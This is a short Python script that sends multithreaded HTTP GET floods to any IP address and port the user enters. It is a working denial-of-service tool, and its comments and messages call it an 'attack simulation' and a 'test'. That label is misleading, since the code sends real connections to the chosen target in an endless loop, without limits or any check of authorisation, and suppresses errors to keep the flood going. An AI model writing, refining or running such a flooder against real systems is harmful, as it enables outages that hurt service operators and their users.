import socket
import threading
import time
from rich.console import Console
from rich.progress import track

console = Console()

def attack(target_ip, target_port):
    # Constructing the HTTP GET request outside the loop for better performance
    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\n\r\n".encode('ascii')
    
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            
            # Send data over TCP using sendall (instead of sendto)
            s.sendall(request)
            s.close()
        except Exception:
            # Suppress exceptions to keep the simulation running smoothly
            pass

def main():
    target_ip = console.input("[green]Enter the target IP: [/green]")
    try:
        target_port = int(console.input("[green]Enter the target port: [/green]"))
        threads = int(console.input("[green]Enter the amount of threads: [/green]"))
    except ValueError:
        console.print("[red]Port and threads must be integers![/red]")
        return

    console.print(f"\n[bold]Configuration:[/bold]")
    console.print(f"IP: {target_ip}")
    console.print(f"Port: {target_port}")
    console.print(f"Threads: {threads}\n")

    # Starting the threads
    for _ in range(threads):
        # Passing target_ip and target_port correctly into the args tuple
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.daemon = True
        thread.start()

    console.print("[cyan]Attack Simulation Running... (Press CTRL+C to stop)[/cyan]")
    try:
        # Progress bar animation
        for _ in track(range(100), description="Sending requests..."):
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        console.print("\n[bold green]The test was successfully stopped.[/bold green]")

if __name__ == "__main__":
    main()